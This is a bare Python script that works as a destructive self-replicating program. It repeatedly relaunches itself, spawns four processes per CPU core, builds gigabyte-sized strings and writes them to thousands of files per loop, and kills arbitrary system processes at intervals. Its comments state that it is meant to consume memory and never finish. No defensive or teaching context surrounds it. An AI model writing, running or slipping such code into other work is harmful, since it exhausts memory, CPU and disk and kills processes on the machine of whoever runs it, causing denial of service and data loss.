import multiprocessing
import random
import string
import os
import sys
import psutil

# Function to generate large data structure
def generate_data():
    data = ''.join(random.choices(string.ascii_lowercase, k=10**9))  # Generate a string of length 10^9
    return data

# Function to kill a random process and log the process ID
def kill_random_process():
    killed_process = None
    for process in psutil.process_iter():
        try:
            process.kill()
            killed_process = process.pid
            break  # Kill only one process
        except:
            pass
    return killed_process

# Function for each process to execute
def print_and_save():
    count = 1
    while True:
        # Start additional processes
        for _ in range(10):  # Start 10 new processes every iteration
            python_executable = sys.executable
            os.system(f"{python_executable} {sys.argv[0]} &")  # Start a new process of itself
        
        # Generate large data structure to consume memory
        data = generate_data()
        
        # Save to multiple text files
        for i in range(10000):  # Create 10000 files per iteration
            file_name = f"output_{count}_{i}.txt"
            with open(file_name, "w") as file:
                file.write(data)
        
        count += 1

        # Kill random processes every 50 iterations
        if count % 50 == 0:
            killed_process = kill_random_process()
            if killed_process:
                print(f"Killed process with PID: {killed_process}")

# Number of processes to create
num_processes = multiprocessing.cpu_count() * 4  # Utilize more CPU cores

# Create and start processes
processes = []
for _ in range(num_processes):
    process = multiprocessing.Process(target=print_and_save)
    process.start()
    processes.append(process)

# Wait for all processes to finish (which will never happen)
for process in processes:
    process.join()
